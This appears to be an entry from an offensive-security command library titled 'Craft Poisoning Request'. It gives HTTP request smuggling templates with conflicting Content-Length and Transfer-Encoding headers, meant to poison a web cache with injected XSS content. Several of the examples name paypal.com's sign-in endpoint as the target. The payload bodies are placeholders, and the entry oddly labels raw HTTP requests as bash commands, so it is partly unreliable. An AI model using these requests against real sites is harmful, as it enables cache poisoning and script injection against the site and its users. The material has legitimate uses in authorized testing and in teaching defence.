---
data: |-
  POST /signin HTTP/1.1
  Host: paypal.com
  Content-Length: 100
  Transfer-Encoding: chunked

  # Inject malicious chunk
tags:
  - cache-poisoning
type: command
executor: bash
platforms:
  - Web
id: b4703b77-33d3-4ce1-aa33-7c53e37ee075
created_at: '2025-12-14T00:11:25.423Z'
updated_at: '2025-12-14T00:11:25.423Z'
verified: false
validated: true
submitted: true
---
# Craft Poisoning Request

## Command

```bash
POST /signin HTTP/1.1
Host: paypal.com
Content-Length: 100
Transfer-Encoding: chunked

# Inject malicious chunk
```

## Description

Crafts a smuggling request to inject malicious content into the cache for poisoning.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `Host` | Target hostname | Yes |
| `Content-Length` | Length for smuggling | Yes |
| `Transfer-Encoding` | Chunked for mismatch | Yes |

## Examples

### Basic Usage

```bash
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

XSS
```

### Advanced Usage

```bash
POST /signin HTTP/1.1
Host: paypal.com
Content-Length: 200
Transfer-Encoding: chunked

# Full XSS payload
```

## Expected Output

Successful request acceptance, leading to poisoned cache.

## Related

- [[commands/test-http-smuggling-cl-te]]
- [[procedures/Craft-Smuggling-Request-for-Cache-Poisoning]]
